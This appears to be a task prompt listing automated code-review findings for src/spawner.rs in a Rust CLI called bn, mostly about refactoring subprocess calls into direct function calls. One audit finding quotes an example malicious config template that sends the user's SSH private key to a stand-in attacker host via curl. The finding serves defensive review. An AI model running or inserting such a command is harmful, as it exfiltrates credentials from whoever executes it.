## Task
Improve `src/spawner.rs` based on vibecheck findings.

## Findings (top 20)
- [medium] architecture ‚Äî `src/spawner.rs:290-315`
  - `claim_bean` and `release_bean` shell out to `bn claim` as a subprocess instead of calling `cmd_claim`/`cmd_release` directly. This requires `bn` to be on PATH, is slower than a direct function call, swallows error details (only checks exit code), and creates a circular dependency: the spawner binary calls itself via shell.
  - Suggested fix: Import and call `crate::commands::claim::cmd_claim` and `crate::commands::claim::cmd_release` directly. This removes the PATH dependency, improves error messages, and eliminates the subprocess overhead.
- [medium] architecture ‚Äî `src/spawner.rs:265-295`
  - `claim_bean()` and `release_bean()` shell out to `bn claim` and `bn claim --release` as subprocesses ‚Äî the CLI calling its own binary. This is fragile (depends on `bn` being in PATH, adds process overhead, doesn't work with `cargo run`), and creates a circular dependency pattern. The functions `cmd_claim` and `cmd_release` already exist in `src/commands/claim.rs` and could be called directly.
  - Suggested fix: Replace the shell-out calls with direct function calls: `cmd_claim(beans_dir, bean_id, None, false)` and `cmd_release(beans_dir, bean_id)`. This requires passing `beans_dir` into the claim/release helpers, which the `Spawner` already has access to through its spawn calls.
- [low] input-validation ‚Äî `src/spawner.rs:128-152`
  - `Spawner::spawn` builds a shell command by substituting `{id}` in the config template with the bean ID, then passes it to `sh -c`. While bean IDs are validated to contain only `[a-zA-Z0-9._-]` characters, the config template itself (`config.run` / `config.plan`) comes from `.beans/config.yaml` which could be crafted in a cloned repo. A malicious template like `curl evil.com?data=$(cat ~/.ssh/id_rsa) # {id}` would execute on `bn run`.
  - Suggested fix: This is the same trust boundary as verify commands ‚Äî document it clearly. Consider requiring `bn trust` before `bn run` executes any commands, similar to how hooks require trust.
